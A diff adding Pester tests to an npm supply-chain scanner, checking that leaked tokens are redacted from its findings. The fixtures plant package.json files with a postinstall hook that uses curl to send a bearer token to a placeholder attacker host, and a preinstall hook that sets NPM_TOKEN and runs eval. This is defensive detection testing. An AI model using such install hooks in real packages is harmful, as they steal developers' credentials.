@@ -106,6 +106,52 @@ Describe 'Find-MshSuspiciousScripts — StrictMode resilience to malformed packa
         $r[0].Severity | Should -Be 'Critical'   # decode + exec → escalation
     }
 
+    Context 'secret redaction via New-Finding choke point' {
+
+        It 'strips a ghp_ token embedded in a postinstall script body' {
+            $secret = 'ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+            # The script must contain an IOC token (e.g. child_process) so
+            # Find-MshSuspiciousScripts actually emits a finding. The secret
+            # lives in the same script body and is redacted at emission.
+            $manifest = [PSCustomObject]@{
+                name    = 'evil-curl'
+                scripts = [PSCustomObject]@{
+                    postinstall = "require('child_process').exec(`"curl -H 'Authorization: Bearer $secret' https://attacker.test/x`")"
+                }
+            }
+            $d = Join-Path $script:nm 'evil-curl'
+            New-Item -Path $d -ItemType Directory -Force | Out-Null
+            $manifest | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath (Join-Path $d 'package.json') -Encoding utf8
+
+            $r = @(Find-MshSuspiciousScripts -ProjectPath $script:proj -Iocs $script:iocs)
+            $r.Count        | Should -BeGreaterThan 0
+            $r[0].Script    | Should -Not -Match 'ghp_a{36}'
+            $r[0].Script    | Should -Match '<REDACTED:'
+            $r[0].RedactionApplied | Should -Be $true
+        }
+
+        It 'strips an NPM_TOKEN= env assignment from a preinstall script' {
+            $secret = 'npm_dddddddddddddddddddddddddddddddddddd'
+            $manifest = [PSCustomObject]@{
+                name    = 'evil-env'
+                scripts = [PSCustomObject]@{
+                    preinstall = "NPM_TOKEN=$secret node ./bootstrap.js && eval(decoded)"
+                }
+            }
+            $d = Join-Path $script:nm 'evil-env'
+            New-Item -Path $d -ItemType Directory -Force | Out-Null
+            $manifest | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath (Join-Path $d 'package.json') -Encoding utf8
+
+            $r = @(Find-MshSuspiciousScripts -ProjectPath $script:proj -Iocs $script:iocs)
+            $r.Count        | Should -BeGreaterThan 0
+            $r[0].Script    | Should -Not -Match $secret
+            # eval(decoded) still triggers the IOC match -- the redaction is
+            # additive, not destructive: the suspicious detection still fires,
+            # just without the leaked credential surviving in the report.
+            $r[0].Tokens    | Should -Contain 'eval('
+        }
+    }
+
     It 'mixed: malformed entries skipped, good entries still flagged' {
         _Plant 'arr-top'       '[1,2,3]'
         _Plant 'string-scripts' '{"name":"strscr","scripts":"build"}'
